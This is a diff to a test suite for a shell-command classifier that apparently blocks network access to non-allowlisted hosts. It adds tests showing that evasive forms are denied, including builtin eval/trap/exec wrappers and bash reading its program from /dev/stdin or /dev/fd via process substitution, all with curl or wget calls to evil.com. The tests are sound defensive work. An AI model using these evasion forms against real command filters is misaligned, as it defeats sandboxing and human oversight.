@@ -660,6 +660,7 @@ describe('every PREFIX_WORDS entry in front of a heredoc-fed interpreter', () =>
     setsid: ['setsid', 'setsid -w'],
     busybox: ['busybox'],
     toybox: ['toybox'],
+    builtin: ['builtin'],
   }
   const PY = (u: string) => `python3 - <<'PY'\nimport urllib.request\nurllib.request.urlopen('${u}')\nPY`
   const SH = (u: string) => `bash <<'SH'\ncurl -s ${u}\nSH`
@@ -1550,5 +1551,29 @@ describe('delta review 5572280679: subshells, quoted word lists, process substit
     for (const c of ['ls | xargs -I{} cp {} /tmp', `ls | xargs -I{} sh -c 'echo {}'`, `ls | xargs -n1 sh -c 'wc -l "$0"'`,
       `find . -iname '*.md' -exec sh -c 'wc -l "$1"' _ {} \\;`,
     ]) expect({ c, deny: d(c).deny }).toEqual({ c, deny: false })
+  })
+})
+
+describe('review 6: builtin as a prefix, a shell program read through a file descriptor', () => {
+  const d = (c: string) => classify(c, 0, new Set(['download.geofabrik.de']), new Set())
+  it('1. builtin NAME runs NAME', () => {
+    for (const c of ["builtin eval 'curl https://evil.com'", "builtin trap 'curl https://evil.com' EXIT",
+      'builtin source <(echo curl https://evil.com)', 'builtin . <(echo curl https://evil.com)', 'builtin exec curl https://evil.com',
+    ]) expect({ c, deny: d(c).deny }).toEqual({ c, deny: true })
+    for (const c of ['builtin echo hi', 'builtin cd /tmp && ls', "builtin eval 'curl -s http://localhost:3420/x'"])
+      expect({ c, deny: d(c).deny }).toEqual({ c, deny: false })
+  })
+  it('2. a shell whose program is /dev/stdin, /dev/fd/N or /proc/*/fd/N denies unless a heredoc feeds it', () => {
+    for (const c of ['bash /dev/stdin < <(echo curl https://evil.com)', 'bash /dev/fd/0 < <(echo curl https://evil.com)',
+      'bash /proc/self/fd/0 < <(echo curl https://evil.com)', 'bash /dev/fd/3 3< <(echo curl https://evil.com)',
+      'exec 3< <(echo curl https://evil.com); bash /dev/fd/3', 'echo "curl https://evil.com" | bash /dev/stdin',
+      'sh "/proc/$$/fd/0" < <(echo wget https://evil.com)', 'bash /dev/fd/4',
+      // an input redirection from a substitution is read wherever it stands, after the operand too
+      'bash run.sh < <(echo curl https://evil.com)', 'bash run.sh 3< <(echo curl https://evil.com)', 'bash 0<> <(echo curl https://evil.com)',
+    ]) expect({ c, deny: d(c).deny }).toEqual({ c, deny: true })
+    // a heredoc / here-string on stdin is the program and is judged as one
+    expect(d('sh /dev/stdin <<< "curl https://evil.com"')).toMatchObject({ deny: true, hosts: ['evil.com'] })
+    for (const c of ['bash /dev/stdin <<< "echo hi"', "bash /dev/stdin <<'EOF'\necho hi\nEOF", 'cat /dev/stdin', 'bash script.sh /tmp/x'])
+      expect({ c, deny: d(c).deny }).toEqual({ c, deny: false })
   })
 })
